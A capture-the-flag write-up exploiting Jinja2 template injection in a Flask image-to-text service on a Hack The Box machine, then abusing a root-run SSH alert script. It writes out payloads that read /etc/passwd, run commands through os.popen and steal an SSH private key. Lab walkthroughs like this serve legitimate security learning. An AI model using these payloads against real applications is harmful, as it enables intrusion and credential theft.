## PORT 80 (HTTP)

On port 80 it's nginx hosting a web page having a domain `images.late.htb`

Let's add the domain name in `/etc/hosts` file

So here let's try uploading an image with a text and see if it actually converts the image into text form

I grabbed this image for the test and after uploading, we get a file name `results.txt` with the image text

## Foothold

We can now try to test for SSTI since this a flask application as the main page says, jinja2 is normally used for templates, we can try `{{7*'7'}}`  and if it returns 7777777 then it's vulnerable to SSTI and is using jinja2 else it would return 49 if it would be using twig 

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---basic-injection

So to make this work, we can take a screenshot of `{{7*'7'}}` on a text editor and save it as an image

It works, now it's time to test for command execution. We can use this payload to test if we can can read files

<img src="https://i.imgur.com/jWl1y7w.png"/>

```bash
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}

```

After uploading this we get the `/etc/passwd` file

<img src="https://i.imgur.com/ZCqQx2L.png"/>

Now we can't get a reverse shell from where even tho we can execute commands with 

```bash
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```

Which would return us 

<img src="https://i.imgur.com/J0BujLE.png"/>

Instead we can grab the ssh key for `svc_acc`

```bash
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /home/svc_acc/.ssh/id_rsa').read() }}
```

<img src="https://i.imgur.com/9enwoWJ.png"/>

After getting shell, we can check what's running in the background for that we can use `pspy`

<img src="https://i.imgur.com/3hstUUU.png"/>

<img src="https://i.imgur.com/ZkOhugq.png"/>

On looking at the script it looks like a normal ssh alert which is sent to root'users mail but if we notice in pspy that script is being executed whenever we login through ssh

<img src="https://i.imgur.com/XpvyPlJ.png"/>

So we just need to add shell commands to it and it will be executed, so I'll be adding a bash reverse shell

<img src="https://i.imgur.com/J22tBZ6.png"/>

After logging in back the script will be executed and we'll have our reverse shell as root user
